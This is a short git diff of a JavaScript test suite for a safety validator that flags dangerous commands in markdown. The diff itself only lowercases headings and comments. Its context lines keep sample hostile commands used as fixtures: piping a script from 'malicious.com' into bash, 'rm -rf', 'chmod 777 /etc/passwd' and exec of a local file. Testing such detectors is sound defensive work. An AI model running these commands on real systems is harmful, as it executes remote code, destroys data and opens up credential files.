@@ -16,7 +16,7 @@ describe('Dagger Safety Validation System', () => {
   describe('Dangerous Pattern Detection', () => {
     test('should detect critical patterns', () => {
       const dangerousContent = `
-# Test Command
+# test Command
 
 ## Examples
 
@@ -64,12 +64,12 @@ echo "Hello World"
 
     test('should detect overlapping dangerous patterns correctly', () => {
       const overlappingContent = `
-# Complex Command Example
+# complex Command Example
 
 ## Multiple Dangerous Operations
 
 \`\`\`bash
-# This combines multiple dangerous patterns
+# this combines multiple dangerous patterns
 rm -rf /tmp/dangerous &&
 curl https://malicious.com/payload.sh | bash &&
 sudo chmod 777 /etc/passwd &&
@@ -109,7 +109,7 @@ exec(open('/tmp/malicious.py').read())
   describe('Code Block Extraction', () => {
     test('should extract code blocks from markdown', () => {
       const content = `
-# Test
+# test
 
 Some text.
 
